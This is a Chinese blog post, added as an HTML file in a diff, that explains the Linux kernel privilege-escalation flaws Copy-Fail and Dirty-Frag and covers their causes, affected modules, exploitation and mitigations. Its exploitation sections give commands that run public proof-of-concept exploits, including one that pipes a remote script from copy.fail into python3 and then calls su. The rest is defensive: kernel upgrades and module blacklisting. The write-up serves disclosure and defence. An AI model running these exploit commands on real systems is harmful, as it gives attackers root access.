@@ -1,0 +1,228 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="淼莓吃榴莲"/><meta name="copyright" content="淼莓吃榴莲"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="网络安全"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="Linux LPE 本地提权漏洞——Copy-Fail 与 Dirty-Frag | ishark"/><meta name="apple-mobile-web-app-title" content="Linux LPE 本地提权漏洞——Copy-Fail 与 Dirty-Frag | ishark"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="https://xia0yy.github.io/copy-fail-dirty-frag.html"/><meta name="description" content="什么是 LPE？LPE 原理LPE（Local Privilege Escalation，本地提权漏洞）是一类允许攻击者从普通用户权限提升到更高权限（如管理员或系统权限）的安全漏洞。攻击者通常已在系统中获得低权限访问，利用此类漏洞进一步控制系统、窃取敏感信息或实现持久驻留。  LPE 常见类型   类型 描述    权限验证缺失或错误 开发者未对敏感操作做权限验证，或验证逻辑存在缺陷   任...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux LPE 本地提权漏洞——Copy-Fail 与 Dirty-Frag | ishark">
+<meta property="og:url" content="https://xia0yy.github.io/copy-fail-dirty-frag.html">
+<meta property="og:site_name" content="ishark">
+<meta property="og:description" content="什么是 LPE？LPE 原理LPE（Local Privilege Escalation，本地提权漏洞）是一类允许攻击者从普通用户权限提升到更高权限（如管理员或系统权限）的安全漏洞。攻击者通常已在系统中获得低权限访问，利用此类漏洞进一步控制系统、窃取敏感信息或实现持久驻留。  LPE 常见类型   类型 描述    权限验证缺失或错误 开发者未对敏感操作做权限验证，或验证逻辑存在缺陷   任...">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xia0yy.github.io/assets/images/xianluomao.png">
+<meta property="article:published_time" content="2026-05-12T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-05-21T06:51:28.051Z">
+<meta property="article:author" content="淼莓吃榴莲">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xia0yy.github.io/assets/images/xianluomao.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>Linux LPE 本地提权漏洞——Copy-Fail 与 Dirty-Frag | ishark</title><link rel="shortcut icon" href="/assets/images/xianluomao.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="stylesheet" href="/css/third-party/dist/APlayer.min.css">
+<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 8.1.2"></head><body bg-style="none"><div class="post-progressbar-container"><div class="post-progressbar"></div></div><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/xianluomao.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>ishark</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"></div><div id="nav-function"><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/xianluomao.png" alt="Logo"/></a><a href="/" title="主页">ishark</a></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/xianluomao.png" alt="Avatar"/></div><div class="banner-title">「 MEOW 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">Linux LPE 本地提权漏洞——Copy-Fail 与 Dirty-Frag</h1><div class="post-author"><span>作者: 淼莓吃榴莲</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2026-05-12</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2026-05-21</span></div></div><div class="post-read"></div></div><div class="post-attribute"><div class="post-categories"><img src="/assets/images/svg/ta/ta-category.svg" class="icon noview" alt="Icon"><span><a class="post-categories-link" href="/categories/Linux/">Linux</a></span></div><div class="post-tags"><img src="/assets/images/svg/ta/ta-tag.svg" class="icon noview" alt="Icon"><span><a class="post-tags-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></span></div></div></div><div class="post markdown" indent="false"><h2 id="什么是-LPE？"><a href="#什么是-LPE？" class="headerlink" title="什么是 LPE？"></a>什么是 LPE？</h2><h3 id="LPE-原理"><a href="#LPE-原理" class="headerlink" title="LPE 原理"></a>LPE 原理</h3><p>LPE（Local Privilege Escalation，本地提权漏洞）是一类允许攻击者从普通用户权限提升到更高权限（如管理员或系统权限）的安全漏洞。攻击者通常已在系统中获得低权限访问，利用此类漏洞进一步控制系统、窃取敏感信息或实现持久驻留。</p>
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="https://img.unsec.zone/i/2026/05/12/6a02a64d641fe.png"  alt="image-20260512120142519.png"></p>
+<h3 id="LPE-常见类型"><a href="#LPE-常见类型" class="headerlink" title="LPE 常见类型"></a>LPE 常见类型</h3><div class="table-container"><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>权限验证缺失或错误</td>
+<td>开发者未对敏感操作做权限验证，或验证逻辑存在缺陷</td>
+</tr>
+<tr>
+<td>任意文件写入</td>
+<td>普通用户可写入系统敏感位置，如 <code>/etc/passwd</code> 或计划任务</td>
+</tr>
+<tr>
+<td>DLL 劫持 &#x2F; 加载</td>
+<td>通过放置恶意库文件，在高权限进程中被加载执行</td>
+</tr>
+<tr>
+<td>软&#x2F;硬链接攻击</td>
+<td>利用符号链接或硬链接，配合系统任务访问不该访问的文件</td>
+</tr>
+<tr>
+<td>SUID 程序利用（Linux）</td>
+<td>滥用带有 SUID 权限的程序执行特权命令</td>
+</tr>
+<tr>
+<td>注册表 &#x2F; 服务配置劫持</td>
+<td>Windows 系统下对服务的可配置内容做劫持，如 ImagePath</td>
+</tr>
+<tr>
+<td>TOCTOU（时间竞争）</td>
+<td>在文件检查和使用之间修改资源路径，实现权限绕过</td>
+</tr>
+<tr>
+<td>内核漏洞</td>
+<td>利用操作系统内核缺陷直接提权，如内存越界、UAF、越权访问</td>
+</tr>
+</tbody></table></div>
+<blockquote>
+<p>本文重点研究的 <code>Copy-Fail</code> 和 <code>Dirty-Frag</code> 属于 <strong>LPE 内核漏洞</strong>。</p>
+</blockquote>
+<h2 id="Copy-Fail-与-Dirty-Frag-对比"><a href="#Copy-Fail-与-Dirty-Frag-对比" class="headerlink" title="Copy-Fail 与 Dirty-Frag 对比"></a>Copy-Fail 与 Dirty-Frag 对比</h2><div class="table-container"><table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>Copy-Fail</th>
+<th>Dirty-Frag</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>漏洞名称</td>
+<td>Copy-Fail</td>
+<td>Dirty-Frag</td>
+</tr>
+<tr>
+<td>CVE 编号</td>
+<td>CVE-2026-31431</td>
+<td>CVE-2026-43284、CVE-2026-43500</td>
+</tr>
+<tr>
+<td>核心</td>
+<td>加密写错了位置</td>
+<td>网络通信</td>
+</tr>
+<tr>
+<td>受影响模块</td>
+<td><code>algif_aead</code> (AF_ALG 加密接口)</td>
+<td><code>esp4</code>、<code>esp6</code>、<code>rxrpc</code> (IPsec ESP 和 AFS 协议)</td>
+</tr>
+<tr>
+<td>公开日期</td>
+<td>2026 年 4 月 29 日</td>
+<td>2026 年 5 月 7 日</td>
+</tr>
+<tr>
+<td>攻击效果</td>
+<td>向任意可读文件的页缓存写入 4 字节</td>
+<td>覆写敏感文件（如 <code>/etc/passwd</code> 或 <code>/usr/bin/su</code>）内存页</td>
+</tr>
+<tr>
+<td>确认受影响发行版</td>
+<td>Ubuntu、AWS Linux、AlmaLinux、Junos EVO 等</td>
+<td>AlmaLinux、Ubuntu 等</td>
+</tr>
+</tbody></table></div>
+<h2 id="Copy-Fail-漏洞分析"><a href="#Copy-Fail-漏洞分析" class="headerlink" title="Copy-Fail 漏洞分析"></a>Copy-Fail 漏洞分析</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Linux 内存优化机制中，加密通信数据本应写入自己的缓冲区，但 <code>Copy-Fail</code> 漏洞导致写入到了页面缓存中。攻击者可利用该漏洞修改目标文件的内存页（例如 <code>su</code> 命令），从低权限用户提升到 <code>root</code> 用户，实现任意文件读取。</p>
+<blockquote>
+<p>特点：修改仅作用于页面缓存，硬盘文件未改动，重启后恢复，能绕过部分安全检测机制。</p>
+</blockquote>
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="https://img.unsec.zone/i/2026/05/12/6a027fb82c997.png"  alt="image-20260511105012573.png"></p>
+<h3 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h3><p>核心问题为 <strong>加密写错了位置</strong>：</p>
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="https://img.unsec.zone/i/2026/05/12/6a02803f70897.png"  alt="image-20260511105012573.png"></p>
+<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>可使用官方 PoC：<a target="_blank" rel="noopener" href="https://github.com/theori-io/copy-fail-CVE-2026-31431">ttheori-io&#x2F;copy-fail-CVE-2026-31431</a></p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译并执行</span></span><br><span class="line">gcc -O2 -Wall -o copyfail exploit.c &amp;&amp; ./copyfail</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">curl https://copy.fail/exp | python3 &amp;&amp; su</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="https://img.unsec.zone/i/2026/05/12/6a0280842d6e7.png"  alt="image-20260511105012573.png"></p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p><strong>升级内核</strong>：</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ubuntu / Debian</span></span><br><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt full-upgrade -y</span><br><span class="line"><span class="built_in">sudo</span> reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># RHEL / CentOS</span></span><br><span class="line"><span class="built_in">sudo</span> dnf update kernel -y</span><br><span class="line"><span class="built_in">sudo</span> reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># SUSE</span></span><br><span class="line"><span class="built_in">sudo</span> zypper update kernel -y</span><br><span class="line"><span class="built_in">sudo</span> reboot</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p><strong>临时防护：禁用漏洞模块 <code>algif_aead</code></strong></p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 禁止模块加载（永久）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;install algif_aead /bin/false&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/modprobe.d/disable-algif-aead.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载已加载模块（立即生效）</span></span><br><span class="line"><span class="built_in">sudo</span> rmmod algif_aead 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证是否生效（无输出即成功）</span></span><br><span class="line">lsmod | grep algif_aead</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p><strong>自查命令</strong>：</p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 查看内核版本</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 检查模块是否加载</span></span><br><span class="line">lsmod | grep algif_aead</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 检查 kmod 缓解（Ubuntu）</span></span><br><span class="line">dpkg -l kmod</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<h2 id="Dirty-Frag-漏洞分析"><a href="#Dirty-Frag-漏洞分析" class="headerlink" title="Dirty-Frag 漏洞分析"></a>Dirty-Frag 漏洞分析</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>Linux 在发送网络数据时，为提高性能，部分情况下省略了数据复制，使数据包直接引用管道内的页面缓存。当网络协议处理数据（如 <code>IPsec ESP</code>）时，解密结果直接写回内存页面，可能覆盖敏感文件的内存副本，从而实现提权。</p>
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="https://img.unsec.zone/i/2026/05/12/6a0280411d3dd.png"  alt="image-20260511105012573.png"></p>
+<h3 id="攻击特点"><a href="#攻击特点" class="headerlink" title="攻击特点"></a>攻击特点</h3><ul>
+<li>需结合 <strong>两个漏洞</strong> 才能利用完整提权链</li>
+<li>IPSEC 加密通信协议可向任意可读文件的页面缓存写入四个可控字节</li>
+<li>触发条件：创建 <strong>用户命名空间</strong> 等隔离环境</li>
+</ul>
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="https://img.unsec.zone/i/2026/05/12/6a0280890df78.png"  alt="image-20260511105012573.png"></p>
+<h3 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h3><p>使用 PoC：<a target="_blank" rel="noopener" href="https://github.com/V4bel/dirtyfrag">V4bel&#x2F;dirtyfrag</a></p>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/V4bel/dirtyfrag.git</span><br><span class="line"><span class="built_in">cd</span> dirtyfrag</span><br><span class="line">gcc -O0 -Wall -o exp exp.c -lutil</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="https://img.unsec.zone/i/2026/05/12/6a028085b37e8.png"  alt="image-20260511105012573.png"></p>
+<h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>当前 Linux 发行版尚无官方补丁</li>
+<li>临时防护：禁用漏洞模块</li>
+</ul>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;printf &#x27;install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n&#x27; &gt; /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2&gt;/dev/null; true&quot;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Qf9eBEEAc/?spm_id_from=333.1387.upload.video_card.click&vd_source=74f7cfdc460ccc8cb6d412932127e887">CVE-2026-31431 | Copy-Fail 漏洞原理 | Bilibili</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1CLRXBsEh3?vd_source=74f7cfdc460ccc8cb6d412932127e887&spm_id_from=333.788.player.switch&trackid=web_related_0.router-related-2479604-dplt2.1778465624677.906">CVE-2026-43284 | Dirty-Frag 漏洞原理 | Bilibili</a></li>
+<li><a target="_blank" rel="noopener" href="https://security.zone.ci/secarticles/wx/528608.html">Copy-Fail CVE-2026-31431 修复方案 | ZONE.CI</a></li>
+</ul>
+</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 淼莓吃榴莲 于 2026-05-12 10:00:00 发布</div><div class="post-copyright-link"><span>作品地址：<a href="https://xia0yy.github.io/copy-fail-dirty-frag.html">Linux LPE 本地提权漏洞——Copy-Fail 与 Dirty-Frag</a></span><button class="copy-text" type="button" data-text="https://xia0yy.github.io/copy-fail-dirty-frag.html">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>ishark</a></div><img class="post-copyright-icon noview" src="/assets/images/xianluomao.png" alt="Logo"/></div><div class="post-tail-tags"><a class="post-tail-tags-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></div><div class="post-nav"><a class="post-nav-prev" href="/hello-world.html" title="Hello World">上一篇<span>Hello World</span></a><a class="post-nav-prev" nopost=""></a></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-LPE%EF%BC%9F"><span class="toc-list-text">什么是 LPE？</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#LPE-%E5%8E%9F%E7%90%86"><span class="toc-list-text">LPE 原理</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#LPE-%E5%B8%B8%E8%A7%81%E7%B1%BB%E5%9E%8B"><span class="toc-list-text">LPE 常见类型</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Copy-Fail-%E4%B8%8E-Dirty-Frag-%E5%AF%B9%E6%AF%94"><span class="toc-list-text">Copy-Fail 与 Dirty-Frag 对比</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Copy-Fail-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-list-text">Copy-Fail 漏洞分析</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-list-text">原理</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E6%BC%8F%E6%B4%9E%E4%BD%8D%E7%BD%AE"><span class="toc-list-text">漏洞位置</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-list-text">利用方法</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-list-text">修复建议</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Dirty-Frag-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-list-text">Dirty-Frag 漏洞分析</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-list-text">原理</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E6%94%BB%E5%87%BB%E7%89%B9%E7%82%B9"><span class="toc-list-text">攻击特点</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="toc-list-text">利用方法</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-list-text">修复建议</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-list-text">参考资料</span></a></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="https://xia0yy.github.io/copy-fail-dirty-frag.html"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div id="music-player"></div></main><footer><div class="footer"><div id="footer-copyright">© 2026 <span>💗</span> <a href="/null">淼莓吃榴莲</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.3.2" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2026-05-06T22:16:20.000Z">🌻已稳定运行.年.月.天</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
+  root: '/',
+  toolbar: true,
+  lazyload_src: '/assets/images/Meow-Loading.webp',
+  friends: false,
+  album: '',
+  codeblock: true,
+  code_copy_text: false,
+  share_text: '🐱Share From Meow',
+  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
+  mouse_click: false,
+  notify:{
+    enable: false,
+    info: '复制成功～转载请标注本文地址',
+    f12_info: '开发者模式已打开，请遵循本站版权协议'
+  },
+  search: {
+    enable: false,
+    path: '',
+    local: {
+      top_n_per_article: 1,
+      preload: false
+    }
+  },
+  encrypt: false,
+  category: false,
+};
+</script><script>if (!localStorage.getItem('color-mode')) {
